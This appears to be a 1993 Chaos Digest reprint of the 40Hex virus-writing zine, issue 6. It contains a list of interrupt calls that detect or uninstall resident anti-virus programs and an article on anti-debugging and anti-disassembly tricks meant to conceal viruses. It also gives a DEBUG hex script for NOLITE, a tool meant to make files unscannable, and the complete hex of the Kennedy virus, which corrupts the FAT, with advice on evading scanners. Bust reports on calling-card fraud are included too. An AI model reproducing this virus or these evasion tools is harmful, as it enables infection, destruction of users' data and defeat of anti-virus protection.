TBSCANX (Resident Virus scanning Util by Frans Veldman)
        INT 2Fh, Function CAh, SubFunct 00h
        Call: AX=CA01, BX=5442h ("TB")
        Returns: AL=00h if not installed, AL=FFh if installed
                 BX=7462h ("tb") if BX was 5442h during call

        INT 2Fh, Function CAh, Subfunction 02h (Set state of TBSCANX)
        Call: AX=CA02h, BL = new state (00h=disabled, 01h=enabled)

VDEFEND (Part of PC-tools.  Works on v7.0)
        INT 21h, Function FAh
        To call: AH=FAh, DX=5945h, AL=subfunction (01h to uninstall)
        returns: CF set on error, DI = 4559h (?)

DATAMON (PC Tools 7.0 file protection)
        INT 2Fh, Funct 62h, Sub Funct 84h
        Call: AX=6284h, BX=0000h (for installation check), CX=0000h
        Returns: AX=resident code segment, BX & CX = 5555h

Flu Shot, or Virex PC
        INT 21h
        Call: AX=0ff0fh
        Returns if either is installed: AX=101h

If anyone has any more Anti-Viral IDs, post 'em on Digital Warfare and I'll
update this list.

                                       --DecimatoR PHALCON/SKISM

+++++

40HEX_6_002     SEGMENT PUBLIC 'code'
                ORG 100H
                ASSUME CS:CODE,DS:CODE,SS:CODE,ES:CODE

;**************************************************************************

Concealment:      Keep Your Code Hidden From Prying Eyes
                                        by Demogorgon/PHALCON/SKISM


  Recently, I have been experimenting with a few new programming techniques
that should be of great interest to the virus writing community. It is always
our top priority to keep our code out of the hands of lamers in order to
prevent the dreaded 'text change' and above all, to cause the anti-virus
community as much grief as possible. In order to do this, we must put a great
deal of effort into concealing our code.  That is the focus of this article.

This file is divided into two parts.  The first part is devoted to developing
'debug resistant' code, and the second part deals with defeating disassem-
blers.  I will not cover encryption, because methods of encryption are
commonly known and there is really not much further I can go with that.
For a complete review of self encryption methods, take a look at Dark Angel's
Funky Virus Writing Guide (number three, the one that hasn't been released
yet.)

Part_I: The debugger is NOT your friend

     The basic idea behind writing debug ressistant code is finding a way to
make your code behave differently when it runs under a debugger.  With a real
mode debugger, this is simplicity itself.  All that is necessary is a little
knowledge of how a debugger works.  A debugger, such as debug or TD traces
through a program by setting handlers to int 1 and int 3.  These are called
after every instruction is executed.  A virus that wishes to avoid being
debugged can simply replace the handlers for these interrupts, and the
results will be just about whatever you want.  Here is some code to do this:

eat_debug:
        push    cs
        pop     ds
        mov     dx, offset eat_int
        mov     ax,2501h
        int     21h
        mov     al,03h
        int     21h
        ...                     ;rest of code
eat_int: iret

  As you can see, this requires minimal space in your code, and is certainly
worth the effort.  You can experiment by placing something else at 'eat_int'.
Another commonly used tactic is to disable the keyboard interrupt while
certain parts of the code are being executed.  This will surely keep lamers
baffled, though a pro would recognize what was going on immediately.  I am
sure McAfee's programmer's scoff at code such as this.  Also note that while
this will defeat the average real mode debugger, any protected mode debugger
will step through this as if it weren't there.  Playing with interrupts will
not help you when your program will be running in a virtual cpu anyway.  One
method I found which will work nicely against td386 is to throw in a hlt
instruction.  This will give TD an exception 13 error, and terminate the
program.  Anyone who is aware of this will just step over a hlt instruction,
so therefore methods must be used to conceal its presence, or to make it a
necessary part of the code.  This will be covered in part II.

  Another trick you can play is to call int3 within your program.  If
someone tries to run your program under a debugger, it will stop each time
int3 is called.  It is possible to trace through it, but it will be annoying
if there are many int3's thrown in.

Part_2: Kill your disassembler

  No matter how well you mess up debuggers, your program is entirely at the
mercy of a programmer armed with a good disassembler.  Unless, of course, you
use techniques that will confuse disassemblers.  My favorite method for
baffling them is to create code that overlaps.  Overlapping code may seem a
little bit too complicated for most of us at first, but with the knowledge of
a few instruction hex translations, you too can make effective overlapping
code without sacrificing too much code size.  Overlapping code can get as
complex as you would like, but this file will only deal with the simplest
examples.


eat_sr: mov     ax,02EBh
        jmp     $-2             ;huh?
        ...                     ;rest of code

This may confuse you at first, but it is fairly simple. The first instruction
moves a dummy value into ax.  The second instruction jmps into the value that
was just moved into ax. '02EB' translates into 'jmp $+2' (remember that words
are stored in reverse).  This jump goes past the first jmp, and continues on
with the code.  This will probably not be sufficient to defeat a good
disassembler like Sourcer, but it does demonstrate the technique. The problem
with this is that Sourcer may or may not just pick up the code after
commenting out the 'jmp $-2'.  It is difficult to predict how Sourcer will
respond, and it usually depends on the bytes that appear directly after the
jmp.  To severely baffle Sourcer, it is necessary to do some stranger things.
Take a look at this example.

erp:    mov     ax,0FE05h
        jmp     $-2h
        add     ah,03Bh
        ...                     ;rest of code

This code is quite a bit more useful than the previous listing.  Let us
simulate what would happen if we were to trace through this code, showing a
hex dump at each step to clarify things.

B8 05 FE EB FC 80 C4 3B   mov     ax,0FE05h       ;ax=FE05h
^^ ^^ ^^
B8 05 FE EB FC 80 C4 3B   jmp     $-2             ;jmp into '05 FE'
         ^^ ^^
B8 05 FE EB FC 80 C4 3B   add     ax,0EBFEh       ;05 is 'add ax'
   ^^ ^^ ^^
B8 05 FE EB FC 80 C4 3B   cld                     ;a dummy instruction
            ^^
B8 05 FE EB FC 80 C4 3B   add     ah,3Bh          ;ax=2503h
               ^^ ^^ ^^

   The add ah,03Bh is there simply to put the value 2503h into ax. By adding
five bytes (as opposed to simply using 'mov ax,2503h') this code will confuse
disassemblers pretty well.  Even if the instructions are disassembled
properly, the value of ax will not be known, so every int call after this
point will not be commented properly, as long as you never move a value into
ax.  You can conceal the value from the disassembler by using 'add ax' or
'sub ax' whenever possible.

   If you examine this closely, you can see that any value can be put into
ax.  Two of the values can be changed to whatever you want, namely the FE in
the first line, and the 3B in the last line.  It is helpful to debug through
this chunk of code to determine what values should be placed here in order to
make ax what you would like it to be.

   Back to the subject of killing debuggers, it is very sneaky to hide
something like a hlt instruction inside another instruction, such as a jmp.
For example, take a look at this:

glurb:  mov     cx,09EBh
        mov     ax,0FE05h ;-\
        jmp     $-2       ;  >--this should look familiar to you
        add     ah,03Bh   ;-/
        jmp     $-10
        ...             ;rest of code

The three lines in the middle are a repeat of the previous example.  The
important part of this code is the first line and the 'jmp $-10'.  What
happens is, the jmp goes back into the 'mov cx' instruction.  The '09EB'
translates into 'jmp $+9'.  This lands in the '$-10' part of the first jmp.
The $-10 just happens to be stored as 0F4h, the hlt instruction.  By making
the hlt part of another instruction, it is not visible when it is being
traced through by td386.  It is also not possible to remove it without
altering the code.

   The purpose of this article is not to supply code to be thrown into your
own programs.  The purpose is to get you to think about new ways to avoid
having your code looked at and modified by others.  The most important thing
is to be original.  It is pointless for you to simply duplicate this code,
because anyone else who has read this file will already know what you are
trying to do.

code            ENDS
                END     concealment

+++++

40Hex Number 6 Volume 2 Issue 2                                    File 003


    Well, there have been plenty of busts in 1992 so here is the run down
to the best of my knowledge for anyone who is interested:

Asphi: Busted by MCI on January 20 for hacking on 476's. Had to pay $2700 for
       the phone calls he made.  From what I found out MCI Wants to nail him
       to the wall.  Charges include: Unlawful use of a computer, Credit Card
       Fraud, Theft of Services, Criminal Conspiracy and some more I can't
       think of, 10 or so total.  And of course they took his system.  He is
       going to have a trial, but a date has not yet been set.

Axiom Codex:  Billed $2000 for equal access codes.

Cold Steel:  Billed $40.00 for 476's

Count Zero: Yet another that got nailed for 476's.  Billed $86.63 and had to
            tell his parents.

Deathblade:  Billed $100 for 476's.

Dekion: Also nailed for 476's.  Not sure if he will be charged.  Billed
        somewhere between $100 - $1000.

Genghas Khan: Nailed for CBI and for 733's.  Not sure about what will happen
              to him, but I heared from his friend that he is really screwed.

Instigator:  I got nailed in the 476 ring too.  They took my system but gave
             it back.  I got billed for $1970.17.  I got charged with 1 count
             of Theft of services.  They dropped the other 8 charges.  I am
             going to be on informal probation for a short period.

Marauder:  Raided last year by GBI, they took his computer equipment and
           never gave it back.  They finally decided to charge him with
           some misdemeanors.

Netrunner:   Billed $100 for 476's.

Terminal:  Arrested same time as Genghas Kahnvict.  He is NOT a minor...

VenoM:  476's again.  Billed $75.00 and had to tell his parents.

*** AND the LAMEST bust of the month award goes to:

DecimatoR - for sitting in his car along a main road while using the beige
box!  He ran up a wopping $0.81 phone bill before the cop came by and asked
him  if he was having car trouble and saw the wires running from the car
into the telephone pole.  He was arrested, then released. No charges have
been filed.... yet!

*** AND the second LAMEST bust of the month award goes to:

Hot Rize - for wizely running his neighbors phone line into his own house.
No one would notice that one, eh?  We also recieved confirmed reports that
he is a dweeb.

---------------------------------------------------------------------------

All 4 PHALCON/SKISM joints went down between January and March.  The Landfill
for security reasons, Digital Warfare because of me getting busted, PHUN LINE
for security reasons, and USSR because Time Lord may be getting busted.
Digital Warfare went back up though, with DecimatoR as sysop.

**  Apparently the head of the 476 operations is Terry Oakes. He is the phone
    Fraud investigator in charge of the TeleConnect Investigations.  Give him
    a ring at 800-476-1234 Ext. 3045.  Thank you.

**  References to 476's are refering to 800-476-9696 owned by Teleconnect, a
    subsidary of MCI. (6 Digit Calling Cards  - Get a LAMER to hack 'em)

**  Make sure you change your passwords if you use the same one on Digital
    Warfare as you do on other boards.  They have the OLD user list.

**  Additions to the list will be on a first busted first added basis.

                                       -Instigator

+++++

40Hex Number 6 Volume 2 Issue 2                                    File 004

                              NOLITE v1.0
                             By DecimatoR
                            of PHALCON/SKISM
                      PD War Collection Program 1

This program will remove the PKLITE header from .EXE and .COM for
two reasons.

A) To make the file un-decompressable, which dosen't mean much if
   you have the registered version of PKLITE.

B) More importantly, makes the PKLITEd file unscannable to virus
   scanners, such as McAfees' Virus Scan etc...

Does this by overwriting the header with random text from memory.

Parameters are simple:

NOLITE filename.ext (Extension MUST be included!)

Will remove the header from PKLITEd files.  It will not remove the
header if it is not a genuine PKLITE file.

Note:  This program is based on PKSMASH, which was written by Hellraiser.
            Unfortunately, a bug surfaced in that program, which caused it
            to lock up sometimes.  So I wrote this to replace PKSMASH, and
            stole HR's dox.  

                                                   ---DecimatoR

Cut out the following code, call it NOLITE.HEX, then DEBUG < NOLITE.HEX

----------- Rip here --------- Slice here --------- Mince Here ----------
n nolite.com
e 0100  4D 5A 53 00 03 00 00 00 09 00 FB 00 FF FF 46 00
e 0110  00 04 00 00 00 01 F0 FF 50 00 00 00 03 01 9A 07
e 0120  8A 15 20 83 C4 06 B8 0D 00 50 B8 01 00 50 9A 2F
e 0130  89 15 20 83 C4 04 C7 06 38 6B 00 00 8B E5 5D C3
e 0140  55 8B EC 83 EC 02 FF 36 16 35 E8 C4 19 83 C4 00
e 0150  7A 01 03 00 01 00 20 00 09 00 FF FF 00 00 00 00
e 0160  00 00 00 01 00 00 3E 00 00 00 01 00 FB 30 6A 72
e 0170  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0180  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0190  B8 38 01 BA 3D 00 8C DB 03 D8 3B 1E 02 00 73 1D
e 01A0  83 EB 20 FA 8E D3 BC 00 02 FB 83 EB 19 8E C3 53
e 01B0  B9 C3 00 33 FF 57 BE 48 01 FC F3 A5 CB B4 09 BA
e 01C0  36 01 CD 21 CD 20 4E 6F 74 20 65 6E 6F 75 67 68
e 01D0  20 6D 65 6D 6F 72 79 24 FD 8C DB 53 83 C3 2D 03
e 01E0  DA BE FE FF 8B FE 8C CD 8B C5 2B EA 8B CA D1 E1
e 01F0  D1 E1 D1 E1 80 EC 10 80 EF 10 8E C0 8E DB F3 A5
e 0200  FC 8E DD 07 06 BF 00 01 33 F6 AD 95 BA 10 00 EB
e 0210  2C 90 AD 95 B2 10 EB 35 AD 95 B2 10 EB 36 AD 95
e 0220  B2 10 EB 3B AD 95 B2 10 EB 5D AD 95 B2 10 EB 5E
e 0230  AD 95 B2 10 EB 5F AD 95 B2 10 72 08 A4 D1 ED 4A
e 0240  74 F4 73 F8 33 C9 33 DB D1 ED 4A 74 C5 D1 D3 D1
e 0250  ED 4A 74 C4 D1 D3 85 DB 74 17 D1 ED 4A 74 BF D1
e 0260  D3 80 FB 06 72 0B D1 ED 4A 75 04 AD 95 B2 10 D1
e 0270  D3 2E 8A 8F 5E 01 80 F9 0A 74 74 33 DB 83 F9 02
e 0280  74 2A D1 ED 4A 74 9D 72 23 D1 ED 4A 74 9C D1 D3
e 0290  D1 ED 4A 74 9B D1 D3 D1 ED 4A 75 04 AD 95 B2 10
e 02A0  D1 D3 80 FB 02 73 15 2E 8A BF 6E 01 AC 8A D8 56
e 02B0  8B F7 2B F3 FA F3 26 A4 FB 5E EB 81 D1 ED 4A 75
e 02C0  04 AD 95 B2 10 D1 D3 80 FB 08 72 DB D1 ED 4A 75
e 02D0  04 AD 95 B2 10 D1 D3 80 FB 17 72 CB D1 ED 4A 75
e 02E0  04 AD 95 B2 10 D1 D3 81 E3 DF 00 86 DF EB BD AC
e 02F0  02 C8 80 D5 00 3C FF 75 82 5B 8B EB 83 C3 10 33
e 0300  C0 AC 91 E3 0E AD 03 C3 8E C0 AD 97 26 01 1D E2
e 0310  F9 EB EC AD 03 C3 FA 8E D0 AD 8B E0 FB AD 03 D8
e 0320  53 AD 50 8E C5 8E DD 33 C0 8B D8 8B C8 8B D0 8B
e 0330  E8 8B F0 8B F8 CB 03 00 02 0A 04 05 00 00 00 00
e 0340  00 00 06 07 08 09 01 02 00 00 03 04 05 06 00 00
e 0350  00 00 00 00 00 00 07 08 09 0A 0B 0C 0D 00 00 00
e 0360  3A 00 00 F5 01 B8 23 00 8E C0 E8 CF 00 E8 00 00
e 0370  C7 00 83 FA 01 B4 09 BA 5C 00 CD 21 74 0A BA 87
e 0380  55 00 00 0C 09 E9 07 01 33 C9 E8 E7 40 01 00 8B
e 0390  D7 B0 02 B4 3D 10 73 03 E9 EE 00 28 40 A3 0C 00
e 03A0  B9 39 51 59 41 83 F9 64 75 39 15 2A CB 2A DD 12
e 03B0  8B 09 A5 1E 1A 01 00 BA 0E 12 3F 28 50 12 80 3E
e 03C0  08 50 75 D9 B9 0B B6 52 11 0F 11 BE 07 BF 49 81
e 03D0  38 10 F3 A6 3A 00 74 0C 5A 52 52 8A 5C B0 1A 42
e 03E0  1A EB B3 A2 6A 0A 33 D2 0A 0E 16 95 43 10 59 49
e 03F0  30 27 5B 35 0D B4 40 58 31 91 24 0F 16 5A 0F 72
e 0400  6E A5 1F 35 49 01 09 16 B4 3E 3D 00 40 64 90 8A
e 0410  04 3C 20 74 06 3C 09 74 02 3C 0D C3 01 40 27 4A
e 0420  01 C3 32 ED 8A 0E 80 00 41 BE 81 01 00 73 4C 01
e 0430  E8 DE FF 75 03 46 E2 F8 51 E3 03 00 A4 FC F3 A4
e 0440  06 1F 59 33 DB E3 0F BE 18 C6 02 85 18 04 C6 04
e 0450  00 43 1C F4 89 1E 29 A1 36 C0 2E E3 0C 3B 0E 00
e 0460  B0 0C 73 06 FC AE 75 FD E2 FB C3 BA FD 21 01 E0
e 0470  B4 4C A0 0B 7E 00 4B 4C 49 54 45 A0 01 20 43 6F
e 0480  70 72 2E 47 8B 0D 0A 36 00 4E 4F 5F 28 63 29 20
e 0490  31 39 39 32 20 00 00 44 65 63 69 6D 61 74 6F 52
e 04A0  20 50 48 41 4C 43 4F 00 00 4E 2F 53 4B 49 53 4D
e 04B0  0D 24 0A 20 20 52 65 6D 6F 70 42 76 65 73 20 50
e 04C0  93 73 69 67 6E 01 14 2A 75 72 65 20 66 72 6F 6D
e 04D0  05 69 A5 0A 6C 1C 2E 52 28 55 73 DC 66 65 3A 20
e 04E0  59 3C 17 A1 4C 27 6D 65 3E 1A 24 1D 3A 05 4E 6F
e 04F0  08 40 77 61 55 66 6F 75 00 00 6E 64 20 2D 20 6E
e 0500  6F 74 68 69 6E 67 20 64 6F 6E 36 25 65 07 32 45
e 0510  72 5F 72 4B A1 1A 2C 74 81 70 74 20 A0 E0 28 73
e 0520  75 63 63 6C 73 66 75 6C 74 7A 22 53 10 21 AB A4
e 0530  5A 40 4E 72 C6 69 AA 52 44 48 19 74 A0 01 40 79
e 0540  65 64 21 24 FF 01 00 00 01 01 00 00 00 00 00 00
e 0550  00 00 01 1A 1A 1A 1A 1A 1A 1A 1A 1A 1A 1A 1A 1A
rcx
055F
w
q

----------- Rip here --------- Slice here --------- Mince Here --------

------------------------------

End of Chaos Digest #1.48
************************************

Chaos Digest              Mercredi 9 Juin 1993        Volume 1 : Numero 49
                            ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.49 (9 Juin 1993)
File 1--40H VMag Number 6 Volume 2 Issue 2 #005-008(1) (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Number 6 Volume 2 Issue 2 #005-008(1) (reprint)


40Hex Number 6 Volume 2 Issue 2                                     File 005

                I'm back, well kind of.  Anyways, a lot of people have been
asking, "What's going on with the group?" The question should be, "What's
going on with any group these days?" It seems to me that 1992 was the death
of h/p, or at least the "ice age" of it.  Everybody was either getting busted
or quitting the scene.  Oh well, what can I say about it.  Our group has been
having bad luck too.  Five (now six) busted as well as other assorted bad
things happening to members.

                Anyways, what's going on with us, huh?.  Well the reason you
haven't heard much from us is because we haven't been releasing our new stuff
to BBS systems (BBS system sounds as redundant as PIN number, I know) because
we have a strong feeling that members of such groups as the CVIA are logging
on to h/p boards in the hope of snatching the latest viruses.  Well not much
you can do about it if you run a BBS, unless you personnally know everyone
who calls your board. But come to think of it - what good does it prove to
release your newest creation to the general public (of the h/p crowd) via BBS
system?  Isn't that the same principle as the warez puppy scene?  I guess you
all can do whatever turns you on but we kind of decided that it would be in
our best interests to release our stuff to BBS's only after they have been
detected by the popular scanners or until they are kind of old.  Not to fear,
40-HEX and "Dark Angel Phunky Writing Guide" will still be on boards at the
same rate as always.

                As for all of you people bitching that no longer have sites
and that we are dead, well your dead - wrong.  The current sites are as
follows (in no specific order) - Digital Warfare (yes it's back, at a new
number however), Time Lords BBS (The U.S.S.R System), The Phunline (yes it's
back), and the newest addition - Crow Technology.  And as for us being dead
yeah right.

** Note from DecimatoR:
The U.S.S.R System recently went down, due to Time Lord getting into a little
hot water.  It WILL return however... we're just not sure when. **

** Note from GHeap:
I am coming back, gimme mo' time!

                So now with that out of the way, on the other news. Hmmm...
Michelangelo caused quite a scare there for a while.  It was pretty cool
to see John, Patti, and the rest of the crew on T.V... John Dvorak has a new
half hour computer talk show on syndicated radio.  I'm sure he wouldn't mind
if we got on the show some time soon.  Check your local radio guide for your
local station and time... I am offering a standing bounty of $1,500 for the
person willing to fly to Ohio and kick Crow Meisters ass for good.  A minor
would be preferred, being that he is under 18 and if I smashed him I could
get sued or something.  Just kidding, Crow Meister is cool with me,
hihihihi... A new federal law is being considered which if passed will outlaw
the authorship of computer viruses totally, research or not.  Read more about
that later in this issue... Hey, I might have a BBS up soon!  I have been
saying that for the past 2 years haven't I?  Well that's the news as I see
it, it's nice to be writing for this rag again.

        Check ya in 25 to life....

                                                        Hellraiser P/S
                                                        1992

This article was typed by Time Lord for HR cuz he is WAY too lazy to send me
a disk in place of a fuckin print out...

+++++

40Hex Number 6 Volume 2 Issue 2                                     File 006

   Well, this little news "tid-bit" came from Attitude Adjuster, one of the
few non-PHALCON/SKISM contributers (ok, the ONLY non P/S member), Thanks a
lot dude, keep the submissions coming.  The article itself is quite sad,
and makes me question the intelligence of our opposition.

                                       -)GHeap&Demo
                                       Thanx to CZ for THE line.
---------------------------------------------------------------------------

                    - We need Computer Virus Snitches -
              Written By Mike Royko, Tribune Media Services.
                      Retyped by The Attitude Adjuster

===========================================================================
        Millions  of computer users are wondering how to protect themselves
against  the wave of viruses that are threatening their machines. I have  a
suggestion.[So do I, avoid Bnu 1.90Beta]

        First, they  should  remember  that these viruses don't spring from
nature. They  are  little  computer  programs  that are created and sent on
their  way  by people  that are brainy,  malicious and  arrogant.[I am  not
brainy]

        So,  the  question is,  how  do you  find  the creators of computer
virus programs?

        Because  they are  arrogant, it's  likely that they want someone to
know what a clever thing they have done. They won't hold a press conference
[Actually, we do hold press conferences.See MichaelAlexander@Computerworld]
but  chances  are they  will brag  to a  trusted friend  or acquaintance or
fellow hacker.

        It is sad, but the world is full of snitches.[Get a thesaurus] Look
at John Gotti,  the nation's  biggest Mafia boss.  There was a time when it
was  unthinkable for  even the lowest-level Mafia soldier to blab.  But now
Gotti has to sit in court while his former  right-hand  man tells about how
they got people whacked.  [We whack people too]

        So if Mafia  figures can be persuaded to tattle[Na-na-na-na-na], is
there any reason  to believe that nerds  have a greater  sense of honor and
loyalty?  [Yes, we also have brains]

       Of course[.] not, but how do you get them to do it?

       Money. [Now yer talking... my mom is really the Dark Avenger, I want
my money now.]

       These  companies [what companies,  I only  hit hospitals]  could use
petty cash  to place  ads in the  computer magazines and on  the electronic
bulletin boards.  [Ok, call my BBS and  post this tidbit.  40Hex now has ad
space available]

       The  ads  would  say  something  like: "A  $50,000  reward  for  any
information leading to the arrest and conviction of virus authors."

[How can you convict a virus author. It isn't illegal.  Go play Tank Wars.]

       The  next question  would be  what to  do with the virus makers once
they  have been  caught. And  that's  the  key  to putting  an  end to  the
problem:  something  that could  be  posted  on  those electronic  bulletin
boards  that  might cause  an aspiring  virus-maker to go take a brisk walk
instead.

        A judge  would sit  and listen  to an  attorney who would say some-
thing like this:

        "Your  honor,  what we  have here  is an  otherwise  fine young man
from  a good  family. His  father is  a brilliant scholar, and the son will
someday be the same."[I am going to be a certified scholar when I grow up.]

        "What  he did  was no  more than  an intellectual prank, a cerebral
challenge of  sorts. Like  the man who climbed Mount Everest because it was
there, he created the virus and sent it fourth because it was there."

        Then, we can hope, the judge might say something like this:

        "Yes,  I am  impressed  by  the  defendant's  brain  power.  And  I
expected you to ask me to give him a slap on the wrist."

        "However,  he  is  not  a child.  He is an adult. And I would think
that  so  brilliant a  grown  man would  know better  than to amuse himself
by screwing with the lives of strangers."  [I haven't screwed one stranger]

        "It's  as if  he hid  inside  the businesses and institutions until
they  were closed  and  everyone had  gone home. Then  he came out and went
through  every  filing cabinet  and drawer and shredded or burned every bit
of useful information he could find."[Cool! Lets try it.]

        "Now,  counselor, what  would you and your law partners say is some
street mope [See Thesaurus] did that  to your firm - crept in and destroyed
every document in your offices? Including the names of clients that owe you
money. Hah, you would be in here asking me to hang him from a tree."[I love
hanging from trees]

        "So  don't  give  me that  smart  kid  from  a good family routine.
[I ain't smart, and family ain't good] He is a self-centered,  insensitive,
uncaring,  arrogant goofball  [And  damn proud].  He didn't  give a  second
thought to the  chaos or  heartbreak he would  cause an adoption  agency, a
hardworking businessman or a medical clinic." [Yes I did.  I aim for them.]

        "Therefore,  I sentence him  to the maximum sentence the law allows
in the local jailhouse [0, NUL, ZIP-o, /dev/null, etc..], which is a really
terrible place, filled with all sorts of crude, insensitive hulks."
[Jay-walkers]

        "Bailiff,  please get the defendent up off the floor and administer
some smelling salts."[More like, why is the defendant laughing?]

        "And change his trousers, quickly."[Fuck you]

                                   []comments added by Demogorgon and GHeap

===========================================================================


                I hope you enjoyed that one as much as I did! Okay, I
        see some really neat things with this man's article. First off,
        I'm sure he's an adept programmer... that is, he can probably
        figure out how to get his VCR to tape something while he is
        off writing his brilliant articles. I enjoy his narrow-minded
        definition of virii (that was mentioned in 40Hex 5), of course,
        all virii are those evil overwriting, trigger date, resident,
        boot track infecting swine (yeah, he probably learned what a
        virus was from watching ABC News covering the Michaelangelo
        crisis!)

                I also enjoy his opinion that all virus authors are
        nerds.  First off, what the hell is a nerd?  I mean, I have
        written a virus before (not saying it was any good), but, I
        don't feel like a nerd!  In fact, I feel quite superior to
        most of the idiots like this guy.  And, I like his great
        statement about my loyalty.  Yes, I'm gonna narc on [PHALCON/
        [Forget this again, and die]]SKISM for $50,000!!! Yeah, right.
        There are a lot of narcs on this not-so good earth, so choose
        your friends wisely.

                I'm quite sure that ads on BBS's (electronic bulletin
        boards! No... cork ones!) would just sufficiently pump up user
        discussion of virii.  I'm not scared of fed intervention, and
        I doubt any authors I know are either.

                This was touched on in 40Hex 5, virus authors are not
        responsible for the spread of their virii unless they are
        actively spreading them!  I mean, it's not my fault that K-Rad
        Man sent my Hard Drive Blender (slices, dices, minces sectors)
        to 1000 Bible boards in Utah. Apparently it hasn't dawned on
        this guy that most virii are not written to be destructive.
        Actually, that's a lie.  There are a lot of virii out there that
        are descructive, but that is changing.  People like the
        PHALCON/SKISM crew realize that not everything must be
        destructive, opening the doors to much larger virus projects
        (ie Bobisms)

                One more thing... QUIT EQUATING THE WORD 'hacker' TO
        EVERY DAMN TYPE OF ELECTRONIC 'crime!!!'

                I'm gonna get this dude's phone #, I say we call him
        sometime...

                        -The Attitude Adjuster-

+++++

40Hex Number 6 Volume 2 Issue 2                                    File 007

     Lets see what good ole' Patty has to say about this:

Virus Name:  Kennedy
Aliases:     Dead Kennedy, 333, Kennedy-333
Scan ID:     [Kennedy]
V Status:    Endangered
Discovered:  April, 1990
Symptoms:    .COM growth; message on trigger dates (see text);
             crosslinking of files; lost clusters; FAT corruption
Origin:      Denmark
Eff Length:  333 Bytes
Type Code:   PNCKF - Parasitic Non-Resident .COM Infector
Detection Method:  ViruScan, Pro-Scan, VirexPC, F-Prot, VirHunt 2.0+,
                   NAV, IBM Scan 2.00+, AVTK 4.32+, VIRx 1.6+, CPAV 1.0+,
                   Novi 1.0.1+, Sweep 2.3.1+, UTScan
Removal Instructions:  F-Prot, VirHunt 2.0+, or delete infected files
General Comments:

The Kennedy virus was isolated in April 1990.  It is a generic
infector of .COM files, including COMMAND.COM.

This virus has three activation dates: June 6 (assassination of
Robert Kennedy 1968), November 18 (death of Joseph Kennedy 1969),
and November 22 (assassination of John F. Kennedy 1963) of any year.
On activation, the virus will display a message the following
message:

        "Kennedy is dead - long live 'The Dead Kennedys'"

The following text strings can be found in the viral code:

        "\command.com"
        "The Dead Kennedys"

Systems infected with the Kennedy virus will experience
cross-linking of files, lost clusters, and file allocation table
errors (including messages that the file allocation table is bad).


--------------------------------Cut Here------------------------------------
n kennedy.com
e 0100  E9 0C 00 90 90 90 CD 20 4B 65 6E 6E 65 64 79 E8
e 0110  00 00 5E 81 EE 0F 01 8B AC 0B 02 B4 2A CD 21 81
e 0120  FA 06 06 74 28 81 FA 12 0B 74 22 81 FA 16 0B 74
e 0130  1C 8D 94 0D 02 33 C9 B4 4E CD 21 72 09 E8 17 00
e 0140  72 04 B4 4F EB F3 8B C5 05 03 01 FF E0 8D 94 20
e 0150  02 B4 09 CD 21 EB EF B8 00 43 BA 9E 00 CD 21 89
e 0160  8C 55 02 B8 01 43 33 C9 CD 21 B8 02 3D CD 21 8B
e 0170  D8 B4 3F 8D 94 52 02 8B FA B9 03 00 CD 21 80 3D
e 0180  E9 74 05 E8 7E 00 F8 C3 8B 55 01 89 94 0B 02 33
e 0190  C9 B8 00 42 CD 21 8B D7 B9 02 00 B4 3F CD 21 81
e 01A0  3D 65 64 74 DE 33 D2 33 C9 B8 02 42 CD 21 83 FA
e 01B0  00 75 D0 3D E8 FD 73 CB 05 04 00 89 84 5B 02 B8
e 01C0  00 57 CD 21 89 8C 57 02 89 94 59 02 B4 40 8D 94
e 01D0  05 01 B9 4D 01 CD 21 72 15 B8 00 42 33 C9 BA 01
e 01E0  00 CD 21 B4 40 8D 94 5B 02 B9 02 00 CD 21 8B 8C
e 01F0  57 02 8B 94 59 02 B8 01 57 CD 21 B4 3E CD 21 E8
e 0200  02 00 F9 C3 B8 01 43 8B 8C 55 02 CD 21 C3 03 00
e 0210  2A 2E 43 4F 4D 00 5C 43 4F 4D 4D 41 4E 44 2E 43
e 0220  4F 4D 00 4B 65 6E 6E 65 64 79 20 65 72 20 64 9B
e 0230  64 20 2D 20 6C 91 6E 67 65 20 6C 65 76 65 20 22
e 0240  54 68 65 20 44 65 61 64 20 4B 65 6E 6E 65 64 79
e 0250  73 22 0D 0A 24 00 00 00 00 00 00 00 00 00 00 00
e 0260  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0270  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
rcx
027F
w
q

---------------------------------Cut Here-----------------------------------

  Ok there it is. Not the most impressive virus around and its caught by just
about every scan on the market, but take PKLite to it and then remove the
